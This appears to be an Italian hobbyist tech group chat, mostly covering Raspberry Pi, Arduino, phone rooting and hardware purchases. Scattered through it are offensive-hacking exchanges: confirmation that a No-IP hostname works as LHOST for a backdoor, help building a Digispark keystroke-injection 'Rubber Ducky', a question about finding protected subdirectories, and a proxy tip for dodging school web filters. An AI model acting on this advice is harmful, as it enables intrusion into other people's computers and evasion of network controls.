Serie tv non web series


Non lo so Rick, mi sembra falso
Prima era a 240€ lel
Ragazzi due cose:
Google assistant per raspberry è arrivato in italiano?
Mi linkate un tutorial per attivare l'audio sul Pi 0 con l'adattatore USB? Nessuno di quelli che ho trovato è valido
Buonasera a tutti, uso questo raspberry come server per switchando ma ogni tanto non so se si spenga o semplicemente mi si sconnetta dal wifi, fatto sta che devo ricollegare l’alimentazione ogni tanto
Sbaglio qualcosa? Non saprei cosa fare
Chi sa aiutarmi con cronjob su Raspberry?
Non riesco a far partire uno script python
Lo script lo devi rendere eseguibile, quindi 
 e a inizio del file scrivere 
Così?
all'inizio dello script python : #!/usr/bin/python3
poi sudo chmod +x 
e poi ./percorso/
Aggiunto, ora vedo se funziona crontab
ok
Non va
errore?
invialo
Non avevo modificato crontab
ah...
Ah, non funziona
errore? pt.2
Non si avvia proprio
strano
non so allora...
prova ad andare nella cartella dello script e a fare .
Worka
mhh...
controlla la sintassi del cronjob e mettici un sudo avanti
poi non so che fare
si riavvia il modem quando si sconnette?
 ho trovato il cell da prendere redmi 5 pro
Plus?
Non mi sembra, il fatto che sia collegato ad un extender di rete può influire? Però comunque anche questo non mi sembra si riavvi. Potrebbe essere perché supero il limite di dispositivi che posso connettere all’extender?
prova a scrivere pythonx.x (dove x.x è è la versione) 

no idea, a me succede quando riavvio il modem
Capisco, grazie mille comunque
Non và
Però dal terminale i comandi funzionano
Ma su Ubuntu? (scusate  ma non ho seguito tutto)
Raspbian
Ah
Che versione di raspbian?
L'ultima
Forse ho capito perché non funziona
Nello script c'è pygame
RAGAZZI
ho bisogno d'aiuto:
devo comprare tipo 24 micro sd 
devono essere ECONOMICHE
non importa la capacità---> possono essere anche da 250Mb o da 1Gb è uguale
però devo pagare poco
qualcuno mi consiglia qualcosa??
Lo store è indifferente?
Pro, lo hanno presentato da poco, se vuoi link
Really? Me lo sono perso
Manda manda
Aaah ma il note
Sisi
Pensavo il redmi normale pro
Ah scusa
Il note è comunque un pataccone
Grazie
Eh ma non sembra male
Raga ma per eseguire un espressione aritmetica  in un IDE c++ (non algebrica) ho bisogno di librerie particolari? La formula che dovrei eseguire é 1/2*a (a+b) dove a e b sono numeri interi interi
Assolutamente no!!! Figo assai
Ma sei pollici sono davvero tanti
Anche in 2:1
Ah
Devi aprirlo e risaldarlo
1. Non so saldarlo. 
2. Ora che lo so sto meglio.
Ma come si apre sto coso
 Ci dovrebbero essere degli incastri... sono tutti diversi non so il tuo come è fatto. Potrebbe anche non essere apribile e di conseguenza puoi solo cambiarlo
Prova a trovare un modo
Cos'è
Il pirulo delle batterie 9V
 prova a vedere se riesci a fare leva da qualche parte per aprirlo
Ma che aperture e aperture
Lo pianto sotto e va anche meglio 
Tanto basta che faccia contatto con la batteria
ragazzi ho un problema, il mio portatile (acer a515-51g-51v7) non si connette ad internet in nessun modo, nè via wifi e nè via lan, qualcuno mi può dare una mano? ho provato ad aggiornare i driver, ho provato "risoluzione problemi", mi dava errori di indirizzo ip, ho resettato la configurazione di windows ma niente... se il wifi ha la password non si connette ed in lan oppure se il wifi è senza password dice "internet non disponibile"

soluzioni? grazie mille
Ah si potrebbe essere una soluzione se devi tenerlo attaccato...
Sisi
Va
Alimenta
Hai abilitato le schede di rete
Va beh buttalo
Ma ora va 
Allora non buttarlo
Tanto basta che faccia contatto
beh sono abilitate
Ho preso il filo e lo ho buttato sul polo della batteria
Fack de polis
in più si dimentica sempre delle password del wifi
Ma si connette via wifi?
solo se non c'è la password e quando non c'è non si connette ad internet
Non ho capito
se non c'è la password si connette e se c'è non si connette
❓
quando non c'è la password si connette, ma non ha internet
Hai provato a vedere se hai qualche conflitto di ip
bo ma è dinamico su questo portatile, non ci dovrebbero essere problemi
E sei sicuro che quell'ip non ce lo abbia anche qualcun'altro
non viene proprio associato
^
Non saprei... Non ho mai visto una cosa simile
  Ma non vanno a tempo...
Ovvio
Altrimenti già si sarebbe fulminata da un pezzo
E vorrei provarci ma non saprei come fare
Con cosa lo stai facendo??
Python
Ma non puoi interfacciarti con un microfono e leggere i segnali alti... non so come si fa ma penso si possa fare
è già... mettina una a led
Devo comprarla
Se scarico il midi e lo converto in gpio?
Ma ho notato che inforge ha una playlist dedicata all’hacking (Oltre quella sulla privacy) sul proprio canale
Com’è che non hanno fatto niente a loro ?
Sai... Youtube
Un sito dove vedere il grafico dei prezzi di un prodotto amazon?
ElCamelizer
Keepa
Ciao ragazzi tutto ok??
Yessa
ma a overVolt sono stati proprio segnalati i video da utenti... su youtube ci sono moltissimi video di hacking
"Utenti", io direi in un altro modo 
bot pagati da utenti di merda* 
Ma posso impostare il ddns fornito da No-ip come LHOST per una backdoor ?
si
va bene qualunque cosa
Aliexpress
Credo sia il prezzo più basso che ho trovato
Ma cambiare canzone no?
non so cosa metterci
forse star wars
ma devo decidere
GIGI DAG
Comunque il tuo impianto stereo è una bomba
"impianto"
Una cassa
2 casse e 1 sub
Si ma sono a 128MB non GB
3GB in tutto
Ma le metti in raid??
Lui ha detto che non importa la capacità
A patto che costano poco
Sorry non avevo letto i messaggi precedenti
sei uno spettacolo
link?
comunque volevo chiedervi se aliexprezs fosse affidabile perchè dovevo prenderci altra roba
AMZDEAL Ad Alta Velocità Micro SD Scheda di Memoria 128 MB/512 MB/1 GB Carta di TF Per I Telefoni Cellulari Smartphone compresse Nero
 
 
(from AliExpress Android)
Sisi
Ho comprato molte cose da lì
grazie mille
L'unico problema è il tempo
si si
Non per farmi i fatti tuoi, maaa... A cosa servono? 
un minuto e ti faccio il messaggio bello 

 ‎$1‎.8‎9 ‎in‎ve‎ce‎ c‎he‎ $‎1.‎99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 5‎.0‎3%
⭐️‎ 4‎.9‎0 ‌‎/‌‎ ‎5.‎00‎ (‎14‎2 ‎re‎ce‎ns‎io‎ni)
 Store: Aliexpress
 

và che bello 
Sì ma senza referral
nope, Scontino li mette in automatico
che bello scontino
una domanda: secondo voi è meglio telegram normale o telegram x?
Mai provato telegram x
io preferisco quello normale 🤷‍♂
Anche io
a me non piace la grafica
Ciao a tutti
Benvenuto 
Si ma ci impiega due mesi o più a arrivare la roba
Quanta gente oggi 

ciaoo
gente, ho il terminale con il codice appena fatto girare in cpp e vorrei copiarmi tutto da terminale e buttarlo in un file...l'unico problema è che per generare tutte queste scritte ci ha messo minuti, andarci di trascinamento e mouse vorrebbe dire il suicidio, come faccio a selezionare tutto?
E sicuro?
L'apk
Omonimo
La stampante stampa

alla fine ho fatto direttamente salvare in un file txt con fstream, 5MiB di file di testo di zeri e uno
Control a
Ctrl+a
non vah, ma se premi il primo punto sopra e poi shift+secondo punto ti seleziona tutto quel che ci sta immezzo...il problema che mi è laggato così tanto da crashare quando l'ho fatto ._.
cosa cambia da dire control a
Nulla
Ma fa più figo
gg
btw ^
ora devo solo inventarmi un modo per prendere quei punti....e disegnare un grafico direttamente, mi sa che mi toccherà farlo a mano con alcuni di quei punti....ma solo alcuni...sai com'è, in 1 minuto ne calcolo 200000
Sempre per il microscopio?
quanto cribbio le hai tirate quelle cinghie? 
Più che potevo
Naaaah
È arrivata nera
Uhhh già arrivata
Magazzino Europa?
Sisi
Mi era arrivata tipo rotta
Poi?
Poi ho comprato il ricambio da amazon
Cosa era rotto?
Ho inviato la foto, il giunto della z era allungato
Ah si, non avevo visto bene
Ha preso una botta nel trasporto e si è allungato
Magari lo potevi anche schiacciare
Pressa idraulica 
Sisi lo ho rifatto, chiederò il danno a gb
Need to improve this
Fa veramente cagare... Consigli?
ragzzi cos'è la password protected subdirectory?
o meglio
come si trova quella di un sito web che abbia un login?
Si sconnette dal Wi-Fi
Probabilmente il tuo router non è stabile
Io da quando ne ho preso uno nuovo non ho più questi problemi
Cosa sbaglio? E poi perché la digispark si connette e disconnette automaticamente dalla porta USB?
Seeeera
Ciao, nessuno può aiutarmi? Come mai si connette e si discosta in continuazione?
Wi-Fi del raspberry lascia un pò a desiderare meglio usare eth
Hai la libreria keyboard?
Si
Così si dichiara?
No tra < quà>
Sera
Partiamo da 0 cosa devo settare nell' IDE di Arduino per caricare sketch
Ciao
Io ancora aspetto la Rubber ducky
Tu hai preso quella con SD?
A me è arrivata ma sono riuscito a caricare solo il Blink
No senza
Quando l'hai ordinata però?
Perché non c è la porta?
I driver?
Pochi giorni dopo il video di over volt
Bangood?
Amazon mi sembra
Ahhhh
Uff
Non riesco a configurare
Bestemmia
Si ha funzionato
Grazie per il consiglio
Uff però quando uso la libreria keyboard mi da sempre questo errore
Prova settare 15mhz
Io preferisco Telegram X
Telegram X è pieno di bug e ha delle funzioni in meno
Ma mi piace di più
Esatto
Ma ha anche dei difetti
Già. Io di solito più una cosa è buggata più la uso... 
Chiedete a 
Lasciamo perdere, va 
Battuta in arrivo... Amante dei buchi

ragazziiii
come si chiamano le freccette del maggiore min sul pc??
quelle che si usano per includere le librerie
urgentee
penso maggiore e minore
Non mi ricordo...
 Portatili seri
Qualcuno al PDF di questo libro

 ivan principato:
Tecnologie e progettazione di sistemi elettrici ed elettronici. Articolazione automazioni. Per le Scuole superiori. Con espansione online: 3 
Perché su Telegram da Android c’è la possibilità di collegare due account e invece su iOS no?
E se c’è come fare?
Bo io non so
perchè Android è meglio ☺️
(a parte gli scherzi, devono ancora aggiungerla probabilmente, forse non la aggiungeranno mai, come facciamo a saperlo? )

ragazzi
mi spiegate perché trovo così ostico usare node? :(
io non capisco. almeno col php se vuoi aggiornare le table sul db lo fai senza framework o libreria. anche per una cosa banalissima ( CRUD ). perché con js deve essere sempre così tutto difficile?
Perché stiamo parlando di due architetture diverse
Completamente diverse
Non possono essere paragonate
ma come
perché io non posso collegarmi a mongo col classico js?
Sfigati di merda
Chi?
...
Ho l'impressione che tu ti riferisca al video, quindi ti do 30 secondi per rispondermi 🤔
Tu🤫
Lol
10
6
scalda i motori 
5
4
3
9
grz
per avermi smutato

uuuuuuu 
i ban, quelli artistici
Ban carpiato con triplo avvitamento
Perchè così tanti dislike??
Sarà quel tizio con i suoi account falsi 
Rip
Gli heiterss
Nessuno sa come risolvere?
Se non ci fai vedere il codice no
Con qualsiasi codice me lo fa
Fai lo screen del codice
Forse è un problema nell' impostazioni di programmatore e scheda?
Ok
Ricordo che non ci sono righe rosse
Quindi per quanto ne so non dovrebbe esserci errore di sintassi
Vanno bene così?
In alto a sinistra 
?
Driverz bruh
Dai raga possibile che nessuno di voi può aiutarmi?
^ 
Eh li ho installati i driver
Clicca su "acquisisci informazioni sulla scheda"
Provo
maaa, perchè ti tintinna lo schermo esattamente?
Tintinnare in che senso? Pochi FPS?
la barra bianca
in alto a sinistra
Ma sono scemo, dovevo scrivere sinistra
esatto
cos'è?
Boh, un bug, ogni tanto mi succede
gg
  non ti senti in colpa a rompere le gambe ai droni?
Spoiler per chi non l'ha visto, e visto che me l'hai detto, vado a vederlo subito
P.S. Guardalo fino alla fine, che se chiudi il video con la canzone di outro ti perdi un pezzo
Hai ragione, cancello il commento?
Niente riesco a fare sketch con la libreria digikeyboard ma non keyboard
Beh uno non fa in tempo a spostare il mouse verso la x di "chiudi finestra" che la canzone stacca subito 
se sei da mobile sì 
Raga a chi di voi piacerebbe scrivere guide sull' informatica per poi pubblicarle?
io
Vieni in privato
Qualcuno può passarmi un codice funzionante per il digispark che usa la libreria digikeyboard?
Dovrebbero esserci gli esempi
File→Examples→DigisparkKeyboard→Keyboard
Un codice tipo che fa qualcosa di buono
Alt + f4

Nessuno ha uno sketch funzionante che si basa sulla libreria digikeyboard
google
Non li trovo raga
Raga
I5-6200u 4gb ram ddr4 e r5 m430 ci stanno per 160/170 euro?
azzarola... il robot strabico
credo di no
Senza mobo ne nulla?
intendeva portatile
la u sta solo nei portatili se ben ricordo
Ah
Ma non vale sui 400/500?
stanno sui 400/500, si
ora controllo meglio
cosa serve apache2 per raspberry?
Con anche la r5
webserver
cioè?
Vorrei comprare un PC .... Ma ne ho trovato uno che. È partito da 130 e sono arrivati con offerte fino a 170
creare un sito web
ok
look

ma che
there isn't a fucking sense
Dipende allora
Gente ho una semplice curva in Blender e voglio smootharla in modo che sia meno spigolosa ma non collabora in nessuna maniera
Idee?
mmhh... 
 ?
boh overvolt aveva fatto un tutorial su blender
ah... no 
sarebbe il colmo se per risolvere un problema si mettesse a guardarsi i suoi tutorial hahahahaha
Boh se non ti ricordi più qualcosa ha anche senso hahah
Subdivision surface?
Se non ho capito male...
Raga. Un ragazzo ha hackerato in suo vpn con telegram.kali linux e python
Se e vero quello che dice. Con un bot puoi fare qualce azione nel pc vittimo. Come.. cambiare le foto del browser,stoppare internet,e avviare internet
Hhahahahahahaha
Ma wut?
Eh non funzionava... alla fine ho risolto eliminando le facce laterali e facendo un subdivide con smooth DOPO
Dove posso trovare un PC portatile potente a poco ??  Mi sto arrendendo
Uh grazie
Solo che adesso non riesco più a creare le facce laterali hahaha
helper per caso (?)
Pensavo fosse un warn
Per cosa? E cosa intendi per
Poco?
E per potente
Ma wut... boh alla fine io rimarrò sempre dell’opinione che fa quello che vuole
Peggio del css
[Family Guy & CSS' GIF here]
Non c'è il tasto smooth in qualche scheda a sinistra? Nel caso subdivision surface fuori dall'edit mode
Aspetta che la trovo
Noooo mi ero scordato del veto sulle gif :(
Un po'...
Se te lo ha fatto provare mica è colpa tua alla fine, cioè non lo hai fatto apposta
Nono, quella con le tendine
No beh ma è stato assurdo davvero...
Programmazione sui 200... Avevo trovato un i5-6200u a 170... E io pirla a non prenderò 
Apperò 200 è difficile trovare qualcosa di buono
Però forse nell'usato
Eh infatti avevo visto l'i5 6200 u che era regalato a 170
6200u a 170€ mi sembra strano ma se è vero ottima offerta
Ma quanto è usato?
Comunque oggi ho sperimentato che processing su Linux su un i5 3337u funziona meglio che processing su Windows con un i7 7700HQ... Sull'i5 framerate di 20000fps, sull'i7 di 700
È che era partito da 130 euro
Unico difetto un graffio sul tasto invio e senza scatola originale
T430
Lenovo?
Anche T420
Mi sa che sono quelli che abbiamo a scuola
Se prendevo quello che ho visto prima ... Che pirletta che son stato
Anche perchè mi serve per compilare gli fpga e mi serve un po' di potenza di calcolo per fare veloce
Andrebbe fatto un remix del "Noo" finale di 
buona sera a tutti, 
stavo rootando il mio s7 edge con la twrp e la lineage. a un certo punto mentre ho messo a flashare la rom si blocca il caricamento allora resetto con gli stessi tasti per accedere alla twrp solo che va in boot loop. allora decido di reinstallare la twrp per sbloccare il boot loop senza però risolvere nulla. ora non riesco ad accedere alla recovery, come posso fare?
sapete aiutarmi?
 
abbiamo trovato l'idea per una collab
Allora, prima di tutto: si accende twrp?
non piu
Come fai a flasharla?
con odin da pc
Mm ok e per avviarla?
intendi i tasti che premo sul telefono?
All'opera, lascio inglese ed inizio subito
tasto home volume su e power
E si blocca?
no non parte piu
rimane sulla scritta samsung s7 ecc
oppure adesso se non accendo il telefono da odin da pc dopo che ho flashato rimane sulla batteria di carica
brickato
rip
non risolvo?
Ma sì che si risolve
Ma com'è successo
e niente...io sono felicio perchè ho imparato a usare i vector in cpp :D
cmq salve a tutti, tra 2 giorni mi trovate sepolto...altro che oggi che ho trovato questi ultimi 20 minuti per scrivere qua, venerdì storia e sabato fisica
stessa cosa successa a me
telefono vivo o no 
devi scaricare Samsung Smart Switch, entri in modalità di emergenza/recovery sul programma e segui quello che ti dice
ok grazie dopo provo ora mi sta aiutando roberto
avevo la recocery non avviabile e android corrotto 
lol
ionemmeno ho una rom dentro ahaha
eh neanch'io, Android aveva metà file e non si avviava
Ah sti bug
prima era facilissimo sui vecchi telefoni
Boh ha tipo sbandato e ho fatto casino coi comandi
Ciao a tutti.
Domanda: ho un json salvato su stringa e devo parsificarlo su Arduino. Idee?
gli ficcavi dentro un rar e faceva tutto da solo
se hai linux... sei fottuto :I
nono ho windows lol
cioè...
Seguo
Qual è il miglior sito secondo voi dal quale acquistare un kit di assemblaggio droni, nel caso anche pezzi separati?
Si
sono l'unico fesso a cui non va smartwitch?
Fpv oppure per riprese?
 
pare sia uscita la versione ufficiale di lineage os per j3 2016
dici che la fonte sia attendibile?
Riprese, serve alla mia scuola e la mia prof mi ha detto di vedere
Su quel sito scrivono un sacco di cose a caso. Vedi se c'è su 

ok
Budget?
nada
non c'è
E allora nulla. Se non c'è lì non è ufficiale
Controlla i prossimi giorni
ok
sto facendo qualche ricerca e ho visto che è uscito l'update a android nougat per tutti i j3 2016
solo che non sto trovando nulla su internet
Samsung fa abbastanza schifo da questo punto di vista
Non che gli altri siano meglio eh
L’ho vista ahahahahahah
Ma la mano si triggera male se la mando
gente, stavo pensando, se io installo nougat americano sul mio s7, ricevo gli aggiornamenti ota che sono rilasciati in america o no?
visto che avevo messo la twrp recovery non mi faceva fare gli aggiornamenti in automatico
e mi chiedeva di fare da odin
ma non dava nessun link, nessuna info
perchè se non sbaglio quando l'avevo fatto all'uscita di nougat con la versione inglese mi arrivavano degli ota inglesi🤔
 mio pc ha 2 ram. quando lo accendo ,si accende anche l'anvtivirus di merda ecc ecc ma ho ram 50%. Quando chiudo l'antivirus non cambia nulla,ma...se gioco un ora su Minecraft poi esco ho il ram 24% why?
Ahn... Boooh Odin lo ho sempre schifato, mai avuto un Samsung (se non un galaxy y di mia sorella tipo boh 7 anni fa o cose del genere)
ok
sto pensando di tornare alla rom di default
Dici?
Boh a me la lineage piace un sacco
Anche se non sono uscite ancora le official di Oreo... L'anno scorso Nougat era pronto a novembre 
:O io non ho mai provato a guidare un drone, solo un elicottero giocattolo ed era inguidabile
Quello in teoria è facile, ho provato anche altre volte ed è andato tutto bene 
Quindi nuovo mercoledì di overvolt è ripariamo con la stampante 3d di Andrea la zampa del drone xD
Ma non si è guastato un esc?
Uhm no mi pare solo staccato
il fatto è che non ci sono official per il mio povero telefono
Magari era già mezzo staccato, ha fatto falso contatto e il drone ha sbandato
Nah
Anti Aliasing 
Uhm.. Non è una curva, è fatta da tanti poligoni
Puoi provare con i modifiers subdivision surface o anche multiresolution con delle constraint
Ma un cilindro è troppo mainstream?
Probabilmente la ha già fatta e non la vuole rifare da 0...
Hai notato che alcuni tasti non sono mappati ?
Pare che non hai fatto la rigenerazione del modello🧐, o almeno questo succede con AutoCAD tipo nei PC vecchi
Ah, ma nessuno può passarmi uno sketch per sto maledetto digispark?
C'è l'esempio  nella libreria
Io ancora non ci ho fatto nulla di serio
Su 
Seguo
Su 
 trovo tutti dai 700 in su 
Qualche consiglio per telai di buona qualità per octacotteri?
(Magari sotto i 300€)
623
ma quel ciack con scritto Domotica 7 dietro?
Anche in quello di web ha usato la scritta domotica 

RAGA
HO CAPITO UNA COSA
Il 1 gennaio 2038 ci sarà il nuovo millenium bug
Per l'overflow dei timestamp sulla unix epoch
Io ho risolto il problema
Ho fuso il pc a 32 bit 
Ahahahahaha
Ma comunque credo che il kernel se ne vada comumque
Perché usa variabili a 32 bit
E quindi riparte dal 1 gennaio 1970(se non ricordo male)
No i pc a 64 bit dovrebbero essere immuni
I PC si
Ma i kernel no
Perché se tu crei un integer non cambia da CPU a cpu
Boh, lo scopriremo solo vivendo 
Per me esploderà qualche centrale nucleare xD

Oppure cederà il sarcofago di Chernobyl e l'elephant foot colerá fuori pronto a uccidere tutti xD
Tutto per aver saturato 4 bytes di memoria
Oppure cede il sarcofago situato sotto il terreno dove era situata la sloi a trento
Per chi non lo sapesse la sloi produceva il piombo tetraetile utilizzato nelle auto e nei carri armati nelle benzine con il piombo
E adesso c'è tipo un sarcofago di cemento perché in teoria c'è sotto ancora il piombo
Lo so 
Di dove sei??
19 gennaio *
Oltre che era un azienda molto grossa quindi conosciuta
Qualcuno lo conosce?  Sapete se si può usare con altre schede?
Sud
Si ma funziona solo per i messaggi in inglese e non ha nemmeno Telegram
Sì ma è geniale lo stesso
nulla di nuovo
Hanno già fixato.
Nei computer a 32 bit si possono usare tranquillamente i 64bit
È geniale l'idea di estenderlo ad app di terze parti nelle notifiche
Io l'ho appena scaricato
se non ha Telegram e va solo in inglese è inutile 
I messaggi in italiano li capisce
Peccato risponda in inglese

E questa è tipo la prima beta
^
avevo visto
Nessuno ha qualche sketch buono per digispark?
Ragazzi una striscia led da 1 metro alimentata a 5v e 1A Arduino non ce la fa a gestirla? Cioè ho bisogno di alimentazione esterna da gestire con i mosfet?
Esatto
 rompi il drone e non registri evento 
È piú di un anno che aspetto qiesto evento e poi non lo registrate. No comment 
Utilizzalo come rubberducky
Quello è l intento ma riesco a usarlo solo con la libreria digikeyboard e non keyboard, e non ci sono codici funzionanti
Questo è il traduttore script -> digisparkese
Basta utilizzare gli stessi script di Hak5 (quelli che ha mostrato nel video)
Ahahaha
Qualcuno ha mai provato?
no, devi usare i mosfet
Con i 5v da alimentazione esterna o da Arduino?
5v esterni
arduino supporta 40mA per ogni pin, per un totale di 200mA
Giorno raga, nel caso io comprassi questa scheda, avrei bisogno della Libreria digikeyboard, giisto?
Sì
Va bene, graziee
É stra easy, trovi tutto in giro
hahahahaha graziee
Un'altra cosa, è possibile fare la Rubberducky con questa, vero?
Sì
La connessione all'IDE di Arduino é facile? Scusate, ma non sono molto pratica ahahahah
In che senso connessione?
Quando collego la porta all'IDE, si connette normalmente, come fosse un Arduino o devo implementare qualcosa?
credo intenda caricare librerie e sketch tramite Arduino Ide
La riconosce da sè o devo scaricare qualcosa?
Scusate per l'ignoranza hahahha
Devi installare i driver della board, e implementare le board al menu dell'IDE
Qua c'è tutto...
Ahh, grazie mille❤️
Fatto bene mi dicono
Ho bisogno di qualche cavo per collegare la scheda al pc o può essere direttamente collegata alla usb del pc?
La inserisci nel pc
Come una normale usb?
Madò raga, questo mondo mi affascina molto ma sono totalmente inesperta hahahah
Non ti preoccupare... farai esperienza come tutti
Hahahhaah lo spero
Quindi come una normale usb? Vado liscio? Hahahah
Si
: 
Attenzione, la prima esecuzione del codice che metterai dentro la rubber ducky sarà sul tuo pc
Ah ok...grazie mille❤
Prego 
Io consiglierei di mettere o un delay lungo tipo 5secondi, oppure mettere un pulsante che quando è premuto non va avanti , in modo da non "intaccare" anche il tuo pc
Video da parte di Dany
Raga ma cosa mi è successo al PC ?
No la DigiSpark è diversa da Arduino
È andato in loop
Va prima caricato lo sketch e poi inserita la board, di per se ha 5 secondi in cui riconosce se è stata collegata per essere riprogrammata o meno
Ah ok
Come risolvo?
Non so che dirti...
Ho paura che tu debba formattare il tutto
2 mesi fa è successo al mi cellulare ed ho dovuto farlo formattare.... ma pc non saprei
Non riesce a completare l'aggiornamento
Formattalo con l'ultima build di Windows 10, è l'unica
Ecco
Comunque vista la velocità con cui si accende il formattone è d'obbligo
è andato in loop a causa di qualche aggiornamento che crea conflitti..solitamente con W10 succede con gli aggiornamenti della scheda video oppure della scheda audio..puoi provare a fare un ripristino di sistema se hai un punto di ripristino, entrando in modalità provvisoria, oppure lo formatti e buonanotte
Il formattone è sempre la scelta migliore
lo so, però se non ha il backup meglio provare prima il ripristino
Comunque w10 con gli aggiornamenti fa spesso casini.... più di una volta ho perso file e due volte è rimasto bloccato per tutta la notte
Mi scrivi in privata i passaggi da fare per formattarlo con gparted ?
Ok
bel video 
Grazie
ragazzziiii
Yesss
sui pc del laboratorio a scuola mia la metà dei siti sono bloccati...
come faccio a sbloccare il blocco o ad accedere come amministratore
Ma non saranno bloccati dal PC
Ci sarà un firewall nella rete
Forse tramite un proxy?
Di quelli online gratuiti
dopo quanti giorni ti è arrivata? 🧐
2
Perfect
 ti posso chiedere una cosa?
Sì ma probabilmente ti risponderò tra un'ora perché sto per spegnere il telefono
ok, se mando la pagina di anagrafe del mio registro elettronico... lo accettano?
Sì
Help pls dove ho mancato l apostrofo?
vai un attimo in pvt
Dopo, devo andare
shish
vabbè, io mando
Raga mi aiutate a correggere lo sketch?
Raga dopo quanto tempo è possibile fare il claim su paypal per pacco mai arrivato da banggood?
Aspè, mi stai dicendo che gli studenti possono avere Github quasi premium gratis?
yup
...
Mmm
*se lo accettano*
Key_esc was not declared...
60 secodi
Hai tempo 60 secondi per inserire la digispark... in modo che il codice precedentemente caricato non venga eseguito
Ciao puoi aiutarmi?
Dimmi... se posso si
Ho problemi a caricare sketch da Rubber ducky sul digispark
Perché sono pieni di errori
Prova a mandarlo qualcosina ricordo del codice spero
Li ho inviati nelle foto in alto
Key left non me lo riconosce
Forse perché il tasto non è mappato
Come anche freccia su giù e destra
Come devo fare?
Devi aprire il file .h e aggiungere manualmente la mappatura del tasto
Digikeyboard.h qualcosa del genere
Visto che ti trovi aggiungi anche le frecce
Ma hahahha
Grazie provo
Li ci sono i define per le frecce... devi trovare qualcosa di simile per il tasto che manca a te
ragazzi ho un problemone con materialize :(
in sostanza non riesco a far andare il datapicker. ho provato di tutto. come faccio? :( 
L ho fatto ma non funziona
Mi pare gli serva anche il js
Devi trovare il tuo tasto... io ho cercato su internet per le frecce
sì, avevo dimenticato di aggiungerlo 
vabbè che figura barberina
Ja raga ma nessuno ne capisce un minimo?

Ahaah tranquillo
Passa a Linux
Che errore ti da
Allora diversi errori: seguendo il video di 
 mi da questo
Altri invece che si basano sulla libreria digikeyboard non mi riconoscono il comando key_esc pur essendo mappato
Anche a me da questo errore ma è il tipo di arduino
 sei cattivo,ti invidio che riesci a bannare
Ti riferisci a me?
?
Cmq io lo ammonivo solamente perche poi nln stavo in pace che lo ho bannato. Sei davvero forte lol
io mi stupisco del fatto che lercio non ci abbia ancora fatto su 999 articoli su quest'uomo
Da sempre e per tutto il tempo in cui sei studente, a me hanno dato due anni (per ora) perché sto in terzo superiore. Se verrò mai bocciato (improbabile) andrò all'università (molto probabile) me ne daranno altri.
Non so a me è un po' diverso anche se l ho collegato al PC la porta in Arduino resta bianca ma gli altri codici me li fa caricare( quelli di esempio)
Pensavo dicessi che stavo infastidendo
vedrò
Ma nuo parlo del ragazzo che ha chiamato sfigati di merda

Perché rimane bianca l opzione?
Alla fine l'hanno mancato e si è schiantato nell'acqua... Ma non si è rovinato e la foto successiva è un "hey potremmo attaccarci un fuoribordo e farlo venire a casa per i cazzi suoi" 

Eccolo qua 
Semplicemente finchè sei uno studente potrai rinnovarlo per 2 anni.

Comunque confermo che accetano la carta dello studente.
Raga di nuovo come devo fare?
Anche tu non sopporti quell'IDE in certi momenti?
Eh ultimamente spesso
Dovrei fare un plugin per Visual Studio che aggiunge il supporto ad Arduino
Però sarebbe abbastanza complicato creare la parte che lo compila per i vari Arduino, per il resto dovrebbe essere abbastanza semplice, anche il gestore delle librerie
Ho sentito di visual micro
Un che taglio esiste già
In questi giorni lo provo
Questo insieme a key_esc affligge tutti gli sketch che tentò di caricare
Basta che supporti le librerie che stanno sul gestore delle librerie di Arduino
Me lo fa quasi sempre quando faccio copia e incolla
Eh infatti, tu hai risolto in qualche modo?
Riscrivendo i caratteri che non gli piacciono
Come faccio a sapere cosa devo modificare?
Però questo sembra un errore di sintassi in realtà
In che linea ti da errore?
Si questi dovrebbero essere di sintassi
Zio
Virgolette nelle virgolette senza l'escape?
Oppure usa le virgolette singole
Nella sintassi C devi usare un backslash come escape

In tutte le sintassi
Ragazzi non ne so molto mi dite come devo scrivere?
Metti un escape prima delle virgolette dentro
" \"roba\" "
Indenta
No raga è pieno di errori
Ragazzi non so per quale motivo ma anche se metto la Usb dove ho il live Os al primo posto nel menu di boot non mi avvia quello ma Windows
Nessuno può darci un occhio? Non ne so abbastanza per correggerli tutti
Avete idea di che problema sia ?
Ma hai utilizzato il traduttore che ti ho inviato io?
Si
Hai installato le librerie DigiSpark
Si ovviamente
Manda una foto degli errori
Sono tutti errori di escape
Non ho capito come correggere

Ad esempio in questo punto devo mettere escape poi?
Si
Anche dove finiscono quelle virgolette
Ma secondo me quelle virgolette sono inutili
Ad ogni inizio e fine di ogni virgoletta che sta all'interno di quella principale?
Niente
a me con l'ultimo non mi fa vedere le anteprime delle notifiche di YouTube..si vede solamente la X per chiudere la notifica
Si ma devi farlo per tutti i caratteri che necessitano dell'escape
Ma le virgolette che chiudono sono al contrario?
Eh?
Ahahahah niente sto sostituendo con gli apostrofi
Ma in questo caso anche network type va tra virgolette singole?
Oddio sembra aver compilato
 adesso provo a caricare
Non succede nulla 
bella gente, da quando sono tornato a casa fino ad ora ho letto storia per l'interrogazione di domani, ho finito adesso....e ho solo "letto"...è stato bello conoscervi, addio.
io sono la terza :D
Si ma cosa ti scrive sul cmd?
Nulla non succede nulla☹️
Non ti apre il cmd
Boh avrai cambiato qualcosa
Maccos
Problema del key_esc
Eppure c è nel digikeyboard.h
dai, di la verità, pure te lo chiami "sichiuel"
Chiamavo*
bravo ù-ù
Per programmare in C++ Atom va bene ?
Con Sublime Text va bene, con CTRL+B compila di default il programma con gcc
Ma ora lo chiamerò Squiggle .-.
Ok grazie

CAZZO e un ora che sto disegnando un skin di MC e il sito di merda si e buggato
Qualcuno di voi ha seguito questo corso e sa se è un buon corso? 

nel dubbio prendi un libro
btw no
io avevo il corso di udacity gratuito...e non era poi male dai, solo che i video non spiegavano nulla, era tutto scritto, ma ok, udemy boh
Non lo so dalle recensione sembra buono ed è l’unico in italiano per c++
da quel che so la gente parla molto bene di udemy
È questo?
Perché nella libreria il tasto e mappato mentre nel codice non mi riconosce key_arrow_down? Ma c è qualcuno che ha fatto Rubber ducky con digispark??
Meglio sublime, al 100% percento
Niente plugin da 8 giga, sintassi colorata semplice, minimappa per quando il codice è lungo e completamente personalizzabile, what else?
Gioele Comoletante
Dove? Io non lo vedo
Tipo la presentazione del nuovo iPhone 
 

HAHAHAHAHAAHAHAHAHHA
vi piace? 
Ci sta
Quando esce la nuova canzone di Garrix, Guetta e Brooks e sei in un gruppo di producers... LOL
Se hai aggiunto quei define di prima dovrebbe funzionare... a me lo ha fatto
Ora non sono a casa... ma volendo se li hai già prova solo a modificarli... nel caso non funzioni qualcosa rimetti come erano prima
Oh sì
